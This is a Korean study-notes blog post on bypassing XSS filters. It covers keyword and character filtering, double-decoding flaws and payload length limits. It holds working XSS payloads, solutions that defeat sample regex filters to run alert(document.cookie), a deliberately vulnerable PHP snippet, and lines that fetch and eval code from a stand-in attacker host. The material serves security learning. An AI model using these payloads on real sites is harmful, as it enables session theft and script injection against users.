---
layout: post
title: "XSS filtering bypass 2"
categories: [SWING, Writeup]
tags: [XSS, JavaScript, Security]
last_modified_at: 2023-11-08
---

5. 자바스크립트 함수 및 키워드 필터링
========================

Unicode escape sequence 지원  
```javascript
var foo = "\u0063ookie";  // cookie
var bar = "cooki\x65";  // cookie
alert(document.cookie);  // alert(document.cookie)
```

Computed member access 지원  
* 객체의 특정 속성에 접근할 때 속성 이름을 동적으로 계산하는 기능  
```python
document["coo" + "kie"] == document["cookie"] == document.cookie
```

위 두 특징을 이용해서 우회 가능  
```python
alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)
window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)
```

xss 공격 구문의 자바스크립트 키워드 필터링한 경우, 우회할 수 있는 방법 多

| 구문 | 대체 구문 |
|------|-----------|
| alert, XMLHttpRequest 등 문서 최상위 객체 및 함수 | window['al'+'ert'], window['XMLHtt'+pRequest'] 등 이름 끊어서 쓰기 |
| window | self, this |
| eval(code) | Fuction(code)() |
| Function | isNaN['constr'+'uctor'] 등 함수의 constructor 속성 접근 |

6개의 문자 [,],(,),!,+ 로 모든 동작 수행 가능  

따옴표 같은 특수 문자를 사용하지 못한다면?  
**-> 문자열 선언**  

따옴표 필터링 -> 템플릿 리터럴 사용  
*템플릿 리터럴: 내장된 표현식을 허용하는 문자열 선언, 여러 줄로 이뤄진 문자열과 문자 보관 가능*  
백틱` 이용해서 선언 가능, 내장된 ${} 표현식 이용해 다른 변수나 식 사용  
```javascript
var foo = "Hello";
var bar = "World";
var baz = `${foo}, ${bar} ${1+1}.`; // "Hello,\nWorld 2."
```

따옴표와 백틱을 모두 사용하지 못한다면?  
**->RegExp 객체 사용**  
객체 생성하고 객체의 패턴 부분 가져오기 -> 문자열  
```javascript
var foo = /Hello World!/.source;  // "Hello World!"
var bar = /test !/ + [];  // "/test !/"
```

**-> String.fromCharCode 함수 사용**  
위 함수는 유니코드의 범위 중 파라미터로 전달된 수에 해당하는 문자 반환  
```javascript
var foo = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
```

**-> 기본 내장 함수나 객체의 문자 사용**  
내장 함수나 객체 -> toString함수 이용 -> 문자열 변경  
```javascript
var baz = history.toString()[8] + // "H"
(history+[])[9] + // "i"
(URL+0)[12] + // "("
(URL+0)[13]; // ")" ==> "Hi()"
```

history.toString()은 []안 history 객체 문자열 반환  
URL.toString()은 function URL() {[native code]} 문자열 반환  
history+[]; history+0처럼 함수나 객체와 산술 연산 -> 객체 내부적으로 toString 함수 호출  

**-> 숫자 객체의 진법 변환**  
10진수 숫자를 36진수로 변경하여 아스키 영어 소문자 범위를 모두 생성할 수 있음  
```javascript
var foo = (29234652).toString(36); // "hello"
var foo = 29234652..toString(36); // "hello"
var bar = 29234652 .toString(36); // "hello"
```

**-> 함수 호출**  
함수 호출 -> 백틱이나 소괄호 사용해야함  
백틱, 소괄호 모두 필터링되어 있는 경우 우회  

1) javascript 스키마를 이용한 location 변경  
javascript: 스키마 사용 -> location 객체 변조  
```javascript
location="javascript:alert\x28document.domain\x29;";
location.href="javascript:alert\u0028document.domain\u0029;";
location['href']="javascript:alert\050document.domain\051;";
```

2) Symbol.hasInstance 오버라이딩  
Symbol을 속성 명칭으로 사용  
Symbol.hasInstance well-known symbol 이용 -> instanceof 연산자 재정의 가능  
Oinstanceof C 연산 -> C에 Symbol.hasInstance 속성에 함수 존재 -> 메소드 호출, instanceof 연산자의 결과값으로 사용  
```javascript
"alert\x28document.domain\x29" instanceof {[Symbol.hasInstance]:eval};
Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29" instanceof [];
```

3) document.body.innerHTML 추가  
자바스크립트 -> 문서 내 새 HTML 코드 추가 가능  
document.body.innerHTML에 코드 추가 -> 새 HTML 코드 문서에 추가 -> 이를 이용해서 자바스크립트 코드 실행  
innerHTML로 코드 실행 -> script말고 이벤트 핸들러로 자바스크립트 코드 실행해야 함  
```javascript
document.body.innerHTML+="<img src=x: onerror=alert(1)>";
document.body.innerHTML+="<body src=x: onload=alert(1)>";
```

오답 정리  
다음을 우회 해서 alert(document.cookie) 실행시키기  
```javascript
function XSSFilter(data){
  if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|constructor|[\-+\\<>{}=]/i.test(data)){
    return false;
  }
  return true;
}
```
```javascript
Boolean[decodeURI('...')](decodeURI('...'))();
Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
```
```javascript
function XSSFilter(data){
  if(/[()"'`]/.test(data)){
    return false;
  }
  return true;
}
```
```javascript
/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};
location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
```

6. 디코딩 전 필터링  
전처리 작업 -> 입력 검증  
검증이 끝난 데이터 디코딩 -> 재사용 불가  
만약 가능하게 되면, 더블 인코딩 취약점  

ex  
**1) 공격자가 더블 URL 인코딩한 공격코드 포함하여 업로드 요청**  
**2) 웹 방화벽이 데이터 디코딩 후 검증, 안전하다고 판단 -> 애플리케이션에 전달**  
**3) 애플리케이션이 다시 디코딩 -> 페이로드 실행**  
```php
<?php
$query = $_GET["query"];
if (stripos($query, "<script>") !== FALSE) {
    header("HTTP/1.1 403 Forbidden");
    die("XSS attempt detected: " . htmlspecialchars($query, ENT_QUOTES|ENT_HTML5, "UTF-8"));
}
...
$searchQuery = urldecode($_GET["query"]);
?>
<h1>Search results for: <?php echo $searchQuery; ?></h1>
```

7. 길이 제한  
삽입 코드 제한 -> 페이로드를 URL fragment 등으로 삽입  
fragment로 스크립트 전달, XSS 지점에서 location.hash로 URL의 fragment 부분 추출 -> eval()로 실행  
이외 쿠키에 페이로드 저장, import 같은 외부 자원을 스크립트로 로드  
```javascript
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie);
```
```javascript
import("http://malice.dreamhack.io");
```
```javascript
var e = document.createElement('script')
e.src='http://malice.dreamhack.io';
document.appendChild(e);
```
```javascript
fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
```